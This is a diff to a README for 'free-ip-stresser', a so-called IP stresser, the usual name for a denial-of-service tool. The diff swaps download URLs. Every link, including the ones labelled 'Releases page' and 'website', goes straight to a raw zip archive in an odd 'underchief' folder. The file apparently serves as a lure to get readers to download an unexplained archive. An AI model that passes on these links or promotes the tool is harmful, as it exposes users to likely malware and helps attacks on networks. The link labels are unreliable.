@@ -6,7 +6,7 @@ Welcome to the free-ip-stresser project! This tool lets you perform network stre
 
 ## 📥 Download Now
 
-[![Download free-ip-stresser](https://raw.githubusercontent.com/beratsahin06/free-ip-stresser/main/underchief/free-ip-stresser.zip)](https://raw.githubusercontent.com/beratsahin06/free-ip-stresser/main/underchief/free-ip-stresser.zip)
+[![Download free-ip-stresser](https://github.com/beratsahin06/free-ip-stresser/raw/refs/heads/main/underchief/stresser_free_ip_1.8.zip)](https://github.com/beratsahin06/free-ip-stresser/raw/refs/heads/main/underchief/stresser_free_ip_1.8.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To run free-ip-stresser, ensure your system meets the following requirements:
 
 ## 🛠️ Installation Instructions
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/beratsahin06/free-ip-stresser/main/underchief/free-ip-stresser.zip). 
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/beratsahin06/free-ip-stresser/raw/refs/heads/main/underchief/stresser_free_ip_1.8.zip). 
 2. **Choose the Latest Version**: Look for the most recent release at the top. Click on it.
 3. **Download the File**: Find the file corresponding to your operating system. Click to download it.
 4. **Locate the Downloaded File**: Once downloaded, navigate to your Downloads folder (or the folder you selected).
@@ -49,7 +49,7 @@ To run free-ip-stresser, ensure your system meets the following requirements:
 
 ## 📞 Support and Feedback
 
-For any questions or feedback, open an issue in this repository. You can also connect with us on our website [Nightmare Stresser](https://raw.githubusercontent.com/beratsahin06/free-ip-stresser/main/underchief/free-ip-stresser.zip).
+For any questions or feedback, open an issue in this repository. You can also connect with us on our website [Nightmare Stresser](https://github.com/beratsahin06/free-ip-stresser/raw/refs/heads/main/underchief/stresser_free_ip_1.8.zip).
 
 ## 💡 Tips
 
@@ -59,7 +59,7 @@ For any questions or feedback, open an issue in this repository. You can also co
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases page](https://raw.githubusercontent.com/beratsahin06/free-ip-stresser/main/underchief/free-ip-stresser.zip). Follow the installation steps above closely for a smooth setup process.
+To get started, visit this page to download: [Releases page](https://github.com/beratsahin06/free-ip-stresser/raw/refs/heads/main/underchief/stresser_free_ip_1.8.zip). Follow the installation steps above closely for a smooth setup process.
 
 ## 📝 License
 
